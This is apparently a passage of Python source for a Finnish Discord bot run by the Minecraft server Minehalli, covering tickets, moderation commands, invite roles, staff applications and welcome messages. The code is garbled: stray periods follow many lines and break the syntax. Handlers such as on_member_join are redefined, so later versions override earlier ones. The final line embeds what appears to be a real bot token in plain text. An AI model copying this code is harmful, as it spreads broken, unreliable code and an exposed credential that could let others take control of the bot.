            
            # Lähetä viesti tikettikanavalle
            embed = discord.Embed(title=f"{ticket_type} Tiketti", description=f"Tiketti luotu käyttäjälle {interaction.user.mention}.", color=discord.Color.blue())
            embed.add_field(name="Ongelman kuvaus", value=self.description.value)
            await ticket_channel.send(embed=embed)
            await interaction.response.send_message("Tiketti luotu!", ephemeral=True)

    await interaction.response.send_modal(TicketForm())

@bot.tree.command(name="dashboard", description="Näytä palvelimet, joilla botti on.", guild=discord.Object(id=GUILD_ID))
async def dashboard(interaction: discord.Interaction):
    if interaction.user.name not in ["winser2003", "vaiskiainen", ".ilppu"]:
        await interaction.response.send_message("Sinulla ei ole oikeuksia käyttää tätä komentoa.", ephemeral=True)
        return
    
    guilds = bot.guilds
    embed = discord.Embed(
        title="Botti on seuraavilla palvelimilla",
        color=discord.Color.blue()
    )
    
    for guild in guilds:
        embed.add_field(name=guild.name, value=f"Jäseniä: {guild.member_count}", inline=False)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)
# Rekisteröi pysyvä näkymä botin käynnistyessä
@bot.command(name="ticketpanel", description="Lisää tikettipaneeli")
@commands.has_permissions(administrator=True)
async def ticketpanel(ctx):
    # Luo embed tikettipaneelille
    embed = discord.Embed(title="Tikettipaneeli", description="Valitse tiketin tyyppi painamalla alla olevia nappeja.", color=discord.Color.blue())
    
    # Lähetä viesti embedin ja pysyvän näkymän kanssa
    await ctx.send(embed=embed, view=PersistentTicketPanel())

@bot.tree.command(name="close", description="Sulje tiketti ja lähetä transkriptio", guild=discord.Object(id=GUILD_ID))
@app_commands.checks.has_permissions(manage_channels=True)
async def close(interaction: discord.Interaction, reason: str):
    """
    Sulkee tiketin, lähettää transkription käyttäjälle, ja siirtää kanavan arkistokategoriaan.
    """
    # Tarkista, että komento suoritetaan tikettikanavalla
    if not interaction.channel.name.startswith("ticket-"):
        await interaction.response.send_message("Tätä komentoa voi käyttää vain tikettikanavilla.", ephemeral=True)
        return

    # Lähetä alustava vastaus, jotta botti ei aikakatkaistu
    await interaction.response.defer(ephemeral=True)

    # Hae kanavan omistaja käyttäjänimen perusteella
    username = interaction.channel.name.split("-")[1]
    creator = discord.utils.find(lambda m: m.name == username or m.display_name == username , interaction.guild.members)

    if not creator:
        await interaction.followup.send(
            f"Käyttäjää nimeltä '{username}' ei löytynyt palvelimelta.",
            ephemeral=True
        )
        return

    try:
        # Hae kanavan viestit ilman jumittumista
        messages = []
        async for msg in interaction.channel.history(limit=None, oldest_first=True):
            messages.append(f"{msg.created_at.strftime('%Y-%m-%d %H:%M:%S')} {msg.author}: {msg.content}")

        # Muodosta transkriptio
        transcript = "\n".join(messages)

        # Lähetä transkriptio DM:ssä
        try:
            await log_action(interaction.guild, f"{interaction.user.mention} Sulki käyttäjän {creator} Tiketin Syystä: {reason}",severity=2,logtype=1)
            embed = discord.Embed(
                title="Tiketti suljettu",
                description=f"Tiketti kanavalta {interaction.channel.name} on suljettu.\n\n**Syy:** {reason}",
                color=discord.Color.blue()
            )
            await creator.send(embed=embed)
            if len(transcript) <= 2000:
                await creator.send(f"**Transkriptio:**\n```\n{transcript}\n```")
            else:
                # Jaa pitkä transkriptio osiin
                for i in range(0, len(transcript), 2000):
                    await creator.send(f"**Transkriptio (osa):**\n```\n{transcript[i:i+2000]}\n```")
        except discord.Forbidden:
            await interaction.followup.send("Käyttäjän DM-viestit ovat estettyjä. Ei voitu lähettää transkriptiota.", ephemeral=True)
            return

        # Siirrä kanava arkistokategoriaan
        archive_category = discord.utils.get(interaction.guild.categories, id=1312782840349462539)
   

        await interaction.channel.edit(category=archive_category)
        await interaction.channel.set_permissions(creator, overwrite=None)

        # Ilmoita onnistuneesta sulkemisesta
        await interaction.followup.send(f"Tiketti suljettu ja siirretty arkistoon. Syy: {reason}", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"Jokin meni pieleen: {str(e)}", ephemeral=True)



@bot.tree.command(name="ticket_ban", description="Estä käyttäjä luomasta tikettejä", guild=discord.Object(id=GUILD_ID))
@app_commands.checks.has_permissions(administrator=True)
async def ticket_ban(interaction: discord.Interaction, user: discord.Member, reason: str = "Ei määritelty"):
    if user.id in banned_users:
        await interaction.response.send_message(f"{user.mention} on jo estetty luomasta tikettejä.", ephemeral=True)
        return

    banned_users.add(user.id)
    save_bans(banned_users)  # Tallenna tiedostoon
    await interaction.response.send_message(f"{user.mention} on estetty luomasta tikettejä. Syy: {reason}", ephemeral=False)
    await log_action(interaction.guild, f"{interaction.user.mention} esti {user.mention}:n luomasta tikettejä. Syy: {reason}",severity=4,logtype=11)

@bot.tree.command(name="ticket_unban", description="Poista käyttäjän tiketti-esto", guild=discord.Object(id=GUILD_ID))
@app_commands.checks.has_permissions(administrator=True)
async def ticket_unban(interaction: discord.Interaction, user: discord.Member):
    if user.id not in banned_users:
        await interaction.response.send_message(f"{user.mention} ei ole estetty.", ephemeral=True)
        return

    banned_users.remove(user.id)
    save_bans(banned_users)  # Tallenna tiedostoon
    await interaction.response.send_message(f"{user.mention}:n tiketti-esto on poistettu.", ephemeral=False)
    await log_action(interaction.guild, f"{interaction.user.mention} poisti {user.mention}:n tiketti-eston.",severity=2,logtype=11)

@ticketpanel.error
async def TicketPanel_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("Sinulla ei ole oikeuksia käyttää tätä komentoa.", ephemeral=True)

@close.error
async def close_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.errors.MissingRole):
        await interaction.response.send_message("Sinulla ei ole oikeutta sulkea tätä tikettiä.", ephemeral=True)

@bot.tree.command(name="ban", description="Ban a user.", guild=discord.Object(id=GUILD_ID))
async def ban(interaction: discord.Interaction, member: discord.Member, reason: str):
    if not has_permission(interaction):
        await interaction.response.send_message("Sinulla ei ole lupaa käyttää tätä komentoa.", ephemeral=True)
        return
    
    embed = Embed(
    title="Sait porttikiellon minehallista",
    description=f"Syy: {reason}",
    color=discord.Color.dark_red()
    )
    embed.set_footer(text=f"Valvoja: {interaction.user}")
    embed.timestamp=datetime.now(ZoneInfo("Europe/Helsinki"))
    
    embed.set_thumbnail(url=member.guild.icon.url if member.guild.icon else None)  # Lisätään palvelimen ikoni, jos saatavilla.
        # Lähetetään varoituksen saaneelle käyttäjälle DM-viesti
    try:
        await member.send(embed=embed)
    except discord.Forbidden:
        interaction.response.send_message("Ei voitu lähettää yksityisviestiä.")
    mod_data = load_mod_data(user_id=member.id)
    mod_data["history"].append({"action": "Ban", "reason": reason, "date": datetime.now(ZoneInfo("Europe/Helsinki")), "moderator": str(interaction.user)})
    await member.ban(reason=reason)
    await interaction.response.send_message(f"{member.mention} on bannattu syystä: {reason}.", ephemeral=True)
    await log_action(interaction.guild, f"{interaction.user.mention} bannasi {member.mention}:n syystä: {reason}",severity=5,logtype=2)

@bot.tree.command(name="kick", description="Kick a user.", guild=discord.Object(id=GUILD_ID))
async def kick(interaction: discord.Interaction, member: discord.Member, reason: str):
    if not has_permission(interaction):
        await interaction.response.send_message("Sinulla ei ole lupaa käyttää tätä komentoa.", ephemeral=True)
        return
    embed = Embed(
    title="Sinut on kickattu minehallista",
    description=f"Syy: {reason}",
    color=discord.Color.red()
    )
    embed.set_footer(text=f"Valvoja: {interaction.user}")
    embed.timestamp=datetime.now(ZoneInfo("Europe/Helsinki"))
    
    embed.set_thumbnail(url=member.guild.icon.url if member.guild.icon else None)  # Lisätään palvelimen ikoni, jos saatavilla.
        # Lähetetään varoituksen saaneelle käyttäjälle DM-viesti
    try:
        await member.send(embed=embed)
    except discord.Forbidden:
        interaction.response.send_message("Ei voitu lähettää yksityisviestiä.")
    mod_data = load_mod_data(user_id=member.id)
    mod_data["history"].append({"action": "Kick", "reason": reason, "date": datetime.now(ZoneInfo("Europe/Helsinki")), "moderator": str(interaction.user)})
    await interaction.response.send_message(f"{member} on kickattu syystä: {reason}.", ephemeral=True)
    await log_action(interaction.guild, f"{interaction.user.mention} kickkasi {member.mention}:n syystä: {reason}",severity=4,logtype=7)
    await member.kick(reason=reason)
   

def has_permission(interaction):
    return interaction.user.guild_permissions.kick_members  # Voit muuttaa tämän oman tarpeen mukaan

# Luo Modstuff.json, jos sitä ei ole


# Tarkista, onko käyttäjällä oikeudet
def has_permission(interaction):
    return interaction.user.guild_permissions.manage_messages  # Voit muuttaa tämän oman tarpeen mukaan

# Lokitusfunktio


async def log_action(guild, action_message, severity,logtype):
    """
    Lokita toiminto ja lähetä se määritettyyn lokikanavaan.
    
    Args:
        guild (discord.Guild): Kilta, jossa toiminto tapahtui.
        action_message (str): Viesti, joka lokitetaan.
        severity (int, optional): Toiminnon vakavuus (1-5). Oletus on 1 (harmaa).
    """
    # Värikoodit vakavuuksille
    severity_colors = {
        1: discord.Color.light_grey(),
        2: discord.Color.green(),
        3: discord.Color.gold(),
        4: discord.Color.orange(),
        5: discord.Color.red(),
    }
    types = {
        1: "Tiketti suljettu",
        2: "Porttikielto",
        3: "Timeout",
        4: "Timeout poistettu",
        5: "Varoitus",
        6: "Varoitus poistettu",
        7: "Kick",
        8: "Massa-ilmoitus",
        9: "Tikettien Massclose",
        10: "Error",
        11: "Muu tapahtuma",
        12: "Unban"
        

    }

    # Valitse väri vakavuuden mukaan (oletus harmaa)
    colore = severity_colors.get(severity, discord.Color.light_grey())
    logintyyppi = types.get(logtype)

    # Etsi lokikanava
    log_channel = discord.utils.get(guild.text_channels, id=1301134964880052255)
    if log_channel:
        embed = discord.Embed(
            title=logintyyppi,
            description=action_message,
            color=colore,
            timestamp=datetime.now(ZoneInfo("Europe/Helsinki"))
        )
        await log_channel.send(embed=embed)
# Komento varoitusten hallintaan


@bot.tree.command(name="unban", description="Poista ban valitulta käyttäjältä", guild=discord.Object(id=GUILD_ID))
@app_commands.checks.has_permissions(ban_members=True)
async def unban(interaction: discord.Interaction, username: str, reason: str):
    """
    Komento, joka poistaa banni valitulta käyttäjältä käyttäjätunnuksen perusteella.
    """
    # Listaa bannatut käyttäjät
    banned_users = []
    async for ban_entry in interaction.guild.bans():
        banned_users.append(ban_entry.user)

    # Etsitään bannattu käyttäjä käyttäjätunnuksen perusteella
    selected_user = discord.utils.get(banned_users, name=username)

    if selected_user:
        try:
            # Poistetaan ban valitulta käyttäjältä
            await interaction.guild.unban(selected_user, reason=reason)

            # Luo Embed ja lähetä se käyttäjälle
            embed = discord.Embed(
                title="Unban",
                description=f"Sinun porttikielto on nyt poistettu syystä: {reason}",
                color=discord.Color.green(),
                timestamp=discord.utils.utcnow()
            )
            await selected_user.send(embed=embed)

            # Lokitoiminto
            
            await log_action(interaction.guild, f"Käyttäjä ({selected_user}) on poistettu porttikiellosta syystä: {reason} \n Valvoja: {interaction.user}", severity=2,logtype=12)

            # Vahvistusviesti ylläpidolle
            await interaction.response.send_message(f"Käyttäjä {selected_user.mention} on poistettu bannista syystä: {reason}", ephemeral=True)

        except discord.Forbidden:
            await interaction.response.send_message("Ei voida poistaa banniä tälle käyttäjälle.", ephemeral=True)
        except discord.HTTPException as e:
            await interaction.response.send_message(f"Tapahtui virhe", ephemeral=True)
    else:
        await interaction.response.send_message(f"Ei löytynyt käyttäjää tunnuksella {username}.", ephemeral=True)

@bot.tree.command(name="warn", description="Manage warnings for a user", guild=discord.Object(id=GUILD_ID))
@app_commands.choices(action=[
    app_commands.Choice(name="Add", value="add"),
    app_commands.Choice(name="Delete", value="delete"),
    app_commands.Choice(name="List", value="list")
])
async def warn(interaction: discord.Interaction, action: str, member: discord.Member, reason: str = None):
    if not has_permission(interaction):
        await interaction.response.send_message("Sinulla ei ole lupaa käyttää tätä komentoa.", ephemeral=True)
        return

    # Defer the response to allow time for processing
    await interaction.response.defer(ephemeral=True)

    mod_data = load_mod_data(user_id=member.id)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if action == "add":
        if reason is None:
            await interaction.followup.send("Syötä syy varoitukselle.", ephemeral=True)
            return
        mod_data["history"].append({"action": "Warn", "reason": reason, "date": now, "moderator": str(interaction.user)})
        save_mod_data(member.id, mod_data)
        embed = Embed(
            title="Olet saanut varoituksen minehallissa",
            description=f"Syy: {reason}",
            color=discord.Color.yellow()
        )
        embed.set_footer(text=f"Valvoja: {interaction.user}")
        embed.timestamp = datetime.now(ZoneInfo("Europe/Helsinki"))
        embed.set_thumbnail(url=member.guild.icon.url if member.guild.icon else None)

        try:
            await member.send(embed=embed)
        except discord.Forbidden:
            await interaction.followup.send("Käyttäjän yksityisviestejä ei voitu lähettää.", ephemeral=True)
        await log_action(interaction.guild, f"{interaction.user.mention} varoitti {member.mention} syystä: {reason}.", severity=3, logtype=5)
        await interaction.followup.send(f"{member.mention} on saanut varoituksen syystä: {reason}.", ephemeral=True)
        

    elif action == "delete":
        warnings = [entry for entry in mod_data["history"] if entry["action"] == "Warn"]
        if not warnings:
            await interaction.followup.send(f"{member.mention} ei ole varoituksia.", ephemeral=True)
            return
        last_warning = warnings[-1]
        mod_data["history"].remove(last_warning)
        save_mod_data(member.id, mod_data)

        embed = Embed(
            title="Varoituksesi on postettu",
            description=f"Varoitus joka poistettiin: {last_warning}",
            color=discord.Color.green()
        )
        embed.set_footer(text=f"Valvoja: {interaction.user}")
        embed.timestamp = datetime.now(ZoneInfo("Europe/Helsinki"))
        embed.set_thumbnail(url=member.guild.icon.url if member.guild.icon else None)

        try:
            await member.send(embed=embed)
        except discord.Forbidden:
            await interaction.followup.send("Käyttäjän yksityisviestejä ei voitu lähettää.", ephemeral=True)

        await interaction.followup.send(f"{member.mention} varoitus poistettu: {last_warning['reason']}.", ephemeral=True)
        await log_action(interaction.guild, f"{interaction.user.mention} poisti varoituksen käyttäjältä {member.mention} syystä: {last_warning['reason']}.", severity=2, logtype=6)

    elif action == "list":
        history_list = [entry for entry in mod_data["history"] if entry["action"] == "Warn"]
        if not history_list:
            await interaction.followup.send(f"{member.mention} ei ole varoituksia.", ephemeral=True)
            return

        warnings_list = "\n".join(f"- **{entry['action']}**: {entry['reason']} (PVM: {entry['date']}, Antaja: {entry['moderator']})" for entry in history_list)
        embed = discord.Embed(
            title=f"{member.name} varoitukset:",
            description=warnings_list,
            color=discord.Color.orange()
        )
        await interaction.followup.send(embed=embed)

    else:
        await interaction.followup.send("Tuntematon toiminto. Käytä `add`, `delete` tai `list`.", ephemeral=True)

@bot.event
async def on_member_join(member):
    inviter = await find_inviter(member)
    if inviter:
        invites = await get_invite_count(inviter)
        await assign_roles_based_on_invites(inviter, invites)
        save_invites(inviter.id, invites)

async def find_inviter(member):
    for invite in await member.guild.invites():
        if invite.uses > invite.max_uses:
            return invite.inviter
    return None

async def get_invite_count(member):
    invites = load_invites()
    return invites.get(str(member.id), 0)

async def assign_roles_based_on_invites(member, invites):
    guild = member.guild
    roles = {
        1: guild.get_role(1311329663200530464),  # Replace with actual role ID for 1 invite
        3: guild.get_role(1312091642144227428),  # Replace with actual role ID for 3 invites
        5: guild.get_role(1312091946130604173),  # Replace with actual role ID for 5 invites
        10: guild.get_role(1312092202561966080)  # Replace with actual role ID for 10 invites
    }

    for invite_count, role in roles.items():
        if invites >= invite_count and role not in member.roles:
            await member.add_roles(role)

def load_invites():
    if not os.path.exists("invites.json"):
        with open("invites.json", "w") as f:
            json.dump({}, f)
    with open("invites.json", "r") as f:
        return json.load(f)

def save_invites(user_id, invites):
    data = load_invites()
    data[str(user_id)] = invites
    with open("invites.json", "w") as f:
        json.dump(data, f, indent=4)
# Komento käyttäjätietojen näyttämiseen
@bot.tree.command(name="whois", description="Näytä käyttäjätiedot.", guild=discord.Object(id=GUILD_ID))
async def info(interaction: discord.Interaction, member: discord.Member):
    mod_data = load_mod_data(member.id)

    embed = discord.Embed(
        title=f"Käyttäjätiedot: {member.name}",
        color=discord.Color.blue()
    )

    # Käyttäjän moderaatiohistoria
    if mod_data.get("history"):
        history_list = "\n".join(f"- **{entry['action']}**: {entry['reason']} (PVM: {entry['date']}, Antaja: {entry['moderator']})" for entry in mod_data["history"])
    else:
        history_list = "Ei historiatietoja."

    embed.add_field(name="Moderaatiohistoria", value=history_list, inline=False)
 
    join_date = mod_data.get("join_date", "Ei määritelty")
    embed.add_field(name="Liittymispäivämäärä", value=join_date, inline=False)
    is_staff = "Kyllä" if mod_data.get("is_staff", False) else "Ei"
    embed.add_field(name="Onko staff?", value=is_staff, inline=False)

    await interaction.response.send_message(embed=embed)

# Viestin lähettämisen yhteydessä liittymispäivämäärän päivitys
@bot.event
async def on_member_join(member):
    mod_data = load_mod_data(member.id)
    mod_data["join_date"] = str(member.joined_at)
    save_mod_data(member.id, mod_data)


class ReviewApplication(View):
    def __init__(self, user, embed):
        super().__init__()
        self.user = user
        self.embed = embed

    @discord.ui.button(label="Hyväksy", style=discord.ButtonStyle.green)
    async def approve(self, interaction: discord.Interaction, button: Button):
        # Näytä lomake hyväksymiselle
        modal = ApprovalModal(self.user, "Hyväksytty")
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Hylkää", style=discord.ButtonStyle.red)
    async def deny(self, interaction: discord.Interaction, button: Button):
        # Näytä lomake hylkäämiselle
        modal = ApprovalModal(self.user, "Hylätty")
        await interaction.response.send_modal(modal)


class ApprovalModal(Modal):
    def __init__(self, user, decision):
        self.user = user
        self.decision = decision
        super().__init__(title=f"Hakemuksen {decision}")

        self.reason = TextInput(
            label="Syy",
            placeholder=f"Miksi hakemus on {decision.lower()}?",
            required=True
        )
        self.add_item(self.reason)

    async def on_submit(self, interaction: discord.Interaction):
        # Ilmoita käyttäjälle päätös ja syy
        try:
            await self.user.send(
                f"Hakemuksesi on {self.decision.lower()}. Syy: {self.reason.value}"
            )
        except discord.Forbidden:
            await interaction.followup.send("Käyttäjälle ei voitu lähettää DM-viestiä.", ephemeral=True)

        # Ilmoita ylläpidolle, että toiminto on valmis
        await interaction.response.send_message(
            f"Hakemus **{self.decision.lower()}.** syystä{self.reason.value} Käyttäjälle ilmoitettu. "
        )


@bot.tree.command(name="haeyp", description="Hae ylläpitoon valitsemallasi tehtävällä", guild=discord.Object(id=GUILD_ID))
@app_commands.choices(tehtava=[
    app_commands.Choice(name="Valvoja", value="valvoja"),
    app_commands.Choice(name="Testaaja", value="testaaja"),
    app_commands.Choice(name="Koodaaja", value="koodaaja"),
    app_commands.Choice(name="Rakentaja", value="rakentaja"),
])
async def HaeYP(interaction: discord.Interaction, tehtava: app_commands.Choice[str]):.
    questions = [
        "Kuinka vanha olet?",
        "Miksi haluat ylläpitoon?",
        "Mikä erottaa sinut muista hakijoista?",
        "Onko sinulla kokemusta tehtävästä?",
        "Onko sinulla rangaistuksia viimeisen kuukauden ajalta jos on, mitä?"
    ]

    try:
        await interaction.response.send_message("Hakemus aloitettu, tarkista DM.")
        await interaction.user.send(f"Hakemus tehtävään: **{tehtava.name}** Pidempi vastaus = parempi todennäkösyys päästä yp")
        answers = []
        for question in questions:.
            await interaction.user.send(question)
            def check(message):
                return message.author == interaction.user and isinstance(message.channel, discord.DMChannel)
            msg = await bot.wait_for("message", check=check, timeout=300)
            answers.append(msg.content)
    except discord.Forbidden:
        await interaction.response.send_message(
            "En voinut lähettää hakemusta sinulle yksityisviestillä. Varmista, että yksityisviestit ovat käytössä.",
            ephemeral=True
        )
        return
    except TimeoutError:
        await interaction.user.send("Et vastannut kysymyksiin ajoissa. Yritä uudelleen komennolla `/Ha.eYP`.")
        return

    embed = discord.Embed(
        title=f"Hakemus tehtävään: {tehtava.name}",
        description=f"Hakemuksen lähettäjä: {interaction.user.mention} ({interaction.user})",
        color=discord.Color.blue(),
        timestamp=discord.utils.utcnow()
    )
    for question, answer in zip(questions, answers):
        embed.add_field(name=question, value=answer, inline=False)

    application_channel = interaction.guild.get_channel(1312400122851627109)
    if application_channel:
        view = ReviewApplication(interaction.user, embed)
        await application_channel.send(embed=embed, view=view)
        await interaction.user.send(
            "Hakemus on lähetetty ylläpidolle. **Älä kysele ylläpidolta hakemuksestasi, tai hakemus hylätään.**"
        )
        await interaction.response.send_message(
            "Hakemus lähetetty. Tarkista yksityisviestisi ohjeiden osalta.", 
            ephemeral=True
        )
    else:
        await interaction.response.send_message(
            "Hakemuskanavaa ei löydy. Ilmoita ylläpidolle virheestä.",
            ephemeral=True
        ).



@bot.tree.command(name="historia", description="Näytä käyttäjän rangaistushistoria.",guild=discord.Object(id=GUILD_ID))
async def historia(interaction: discord.Interaction, member: discord.Member):
    user_data = load_user_data2()  # Lataa data modstuff.json:sta
    user_id = str(member.id)  # Hanki käyttäjän ID merkkijonona

    # Etsitään käyttäjän tiedot
    if user_id in user_data:
        data = user_data[user_id]
        history = data.get("history", [])

        if history:
            embed = discord.Embed(title=f"{member.name} rangaistushistoria", color=discord.Color.blue())
            
            for entry in history:
                action = entry.get("action", "Tuntematon")
                reason = entry.get("reason", "Ei syytä")
                date = entry.get("date", "Ei päivämäärää")
                moderator = entry.get("moderator", "Tuntematon").
                
                embed.add_field(
                    name=f"Toiminto: {action}",
                    value=f"Syyt: {reason}\nPäivämäärä: {date}\nAntaja: {moderator}",
                    inline=False
                )
            
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message(f"{member.name} ei ole saanut rangaistuksia.", ephemeral=True)
    else:
        await interaction.response.send_message(f"{member.name} ei ole tallennettu tietokantaan.", ephemeral=True)
.

# Start the scheduler


######### STAFF MANAGER END ###################
#############################################
######### WELCOMER START #############
@bot.event
async def on_member_join(member):
    channel = discord.utils.get(member.guild.text_channels, name="🚪︱tervetuloa")  
    embed = discord.Embed(
        title="Tervetuloa Minehalliin!",
        description=f"Tervetuloa Minehalliin {member.mention}!",.
        color=discord.Color.from_rgb(173, 216, 230)
    )
    
    if member.avatar:
        embed.set_thumbnail(url=member.avatar.url)

    embed.add_field(name="", value="Hauska, että löysit tänne! Olemme suomalainen minecraft-palvelin pienellä yhteisöllä!", inline=False)
    embed.add_field(name="", value="Luo tiketii, jos sinulla on ongelma. ", inline=False)
    embed.add_field(name="", value="Kannattaa myös käydä katsomassa info niin saat vähän infoa palvelimesta!", inline=False)

    view = discord.ui.View()
    button = discord.ui.Button(label="Verkkosivut", url="https://minehalli.fi/")
    view.add_item(button)

    await channel.send(embed=embed, view=view)
    ########## WELCOMER END ################
@bot.tree.command(name="ehdota", description="Ehdota päivän kysymystä", guild=discord.Object(id=GUILD_ID)).
async def ehdota(interaction: discord.Interaction, kysymys: str):
    admin_channel = bot.get_channel(ADMIN_CHANNEL_ID)
    embed = discord.Embed(
        title="Uusi kysymys ehdotus",
        description=f"**{kysymys}**\n\nEhdottaja: {interaction.user.mention}",
        color=discord.Color.blue()
    )
    embed.set_footer(text="Odottaa...")

    view = AdminApprovalView(interaction.user, kysymys)
    await admin_channel.send(content=f"{bot.get_guild(GUILD_ID).get_role(ROLE_ID).mention}", embed=embed, view=view)
    await interaction.response.send_message("Kiitos ehdotuksesta! Ylläpito käsittelee sen pian.", ephemeral=True)

class AdminApprovalView(discord.ui.View):
    def __init__(self, user, question):
        super().__init__(timeout=None).
        self.user = user
        self.question = question
# Nappulat viesttiin, jossa voi hyväksyy tai hylkää ehdotuksen
    @discord.ui.button(label="Hyväksy", style=discord.ButtonStyle.green)
    async def approve(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = interaction.message.embeds[0]
        embed.set_footer(text="Hyväksytty")
        await interaction.message.edit(embed=embed, view=None)
        await interaction.response.send_message("Kysymys hyväksytty.", ephemeral=True)
        await self.user.send(f"Kysymyksesi on hyväksytty: **{self.question}**")

    @discord.ui.button(label="Hylkää", style=discord.ButtonStyle.red)
    async def reject(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(RejectReasonModal(self.user, self.question, interaction.message))

class RejectReasonModal(discord.ui.Modal, title="Hylkää kysymys"):
    reason = discord.ui.TextInput(label="Hylkäyksen syy", style=discord.TextStyle.paragraph)

    def __init__(self, user, question, message):
        super().__init__()
        self.user = user.
        self.question = question
        self.message = message
# Laita dm
    async def on_submit(self, interaction: discord.Interaction):
        embed = self.message.embeds[0]
        embed.set_footer(text=f"Hylätty: {self.reason.value}")
        await self.message.edit(embed=embed, view=None)
        await interaction.response.send_message("Kysymys hylätty.", ephemeral=True)
        await self.user.send(f"Kysymyksesi on hylätty: **{self.question}**\nSyy: {self.reason.value}")
.
class EventView(View):
    def __init__(self):
        super().__init__(timeout=None)
    # Elokuvailta juttui
    @discord.ui.button(label="Liity tapahtumaan", style=discord.ButtonStyle.primary).
    async def join_event(self, interaction: discord.Interaction, button: Button):
        event_role = interaction.guild.get_role(EVENT_ROLE_ID)
        if event_role not in interaction.user.roles:
            await interaction.user.add_roles(event_role)
            await interaction.response.send_message(f"Sinulle on annettu rooli {event_role.name}.", ephemeral=True)
        else:
            await interaction.response.send_message("Sinulla on jo tämä rooli.", ephemeral=True)

    @discord.ui.button(label="Pyydä taukoa", style=discord.ButtonStyle.secondary)
    async def request_break(self, interaction: discord.Interaction, button: Button):
        event_role = interaction.guild.get_role(EVENT_ROLE_ID)
        if event_role in interaction.user.roles:
            modal = BreakModal()
            await interaction.response.send_modal(modal)
        else:
            await interaction.response.send_message("Sinulla täytyy olla tapahtumarooli pyytääksesi taukoa.", ephemeral=True)

# Modal for break request
class BreakModal(Modal):
    def __init__(self):
        super().__init__(title="Tauon pyyntö")

        # Replacing InputText with TextInput
        self.break_time = TextInput(label="Kuinka kauan haluat tauon kestävän (min)", placeholder="max. 15 minuuttia")
        self.add_item(self.break_time)

    async def on_submit(self, interaction: discord.Interaction):
        break_duration = self.break_time.value
        
        # Get the role that should be pinged
        role = interaction.guild.get_role(HOST_ROLE_ID)  # Replace with the ID of the role to be pinged

        # Send to another channel for approval
        channel = interaction.guild.get_channel(BREAK_REQUEST_CHANNEL_ID)
        
        # Create the embed message
        embed = discord.Embed(
            title="Tauon pyyntö", 
            description=f"{interaction.user.name} pyytää taukoa {break_duration} minuuttia."
        )
        
        # View with approval buttons
        view = BreakApprovalView(user=interaction.user, duration=break_duration)
        
        # Send the message to the channel, pinging the role
        await channel.send(content=f"{role.mention}", embed=embed, view=view)
        await interaction.response.send_message(f"Taukopyyntösi {break_duration} minuuttia on lähetetty.", ephemeral=True)
# Approval view for the break request
class BreakApprovalView(View):
    def __init__(self, user, duration):
        super().__init__(timeout=None)
        self.user = user
        self.duration = duration
# Taukopyynnön hyväksyminen tai hylkäys.
    @discord.ui.button(label="Hyväksy", style=discord.ButtonStyle.success)
    async def approve_break(self, interaction: discord.Interaction, button: Button):
        notification_channel = interaction.guild.get_channel(NOTIFICATION_CHANNEL_ID)
        await notification_channel.send(f"{self.user.name} tauko {self.duration} minuuttia on hyväksytty.")
        await interaction.response.send_message(f"Hyväksyit tauon pyynnön: {self.user.name}, {self.duration} minuuttia.", ephemeral=True)
    
    @discord.ui.button(label="Hylkää", style=discord.ButtonStyle.danger)
    async def deny_break(self, interaction: discord.Interaction, button: Button):
        await self.user.send(f"Taukopyyntösi {self.duration} minuuttia on hylätty.")
        await interaction.response.send_message(f"Hylkäsit tauon pyynnön: {self.user.name}, {self.duration} minuuttia.", ephemeral=True)
@bot.command()
async def slowmode(ctx, seconds: int):
    # Tarkistetaan, että käyttäjällä on oikea rooli
    role = discord.utils.get(ctx.guild.roles, name=MEDIA_ROLE_ID)
    role2 = discord.utils.get(ctx.guild.roles, id = 1241771671803793500)
    
    if role not in ctx.author.roles:
        await ctx.send('Sinulla ei ole oikeuksia käyttää tätä komentoa.')
        return

    # Tarkistetaan, että slowmode on välillä 0-20 sekuntia
    if seconds < 0 or seconds > 20:
        await ctx.send('Slowmode-aika pitää olla 0 ja 20 sekunnin välillä.')
        return

    try:
        # Asetetaan kanavan slowmode
        await ctx.channel.edit(slowmode_delay=seconds)
        await ctx.send(f'Slowmode on asetettu {seconds} sekunniksi tähän kanavaan!')
    except discord.Forbidden:
        await ctx.send('Minulla ei ole oikeuksia muuttaa kanavan asetuksia.')
    except discord.HTTPException as e:
        await ctx.send(f'Jokin meni vikaan: HTTPException')


# Aja botti nein

bot.run("MTI0NDYzMzQ1MDM1MTE2OTY1Ng.Gn0t9b.zzPO2hYezlvOyooF0l3fLHJKMaKLfuhJSx1HpI")































































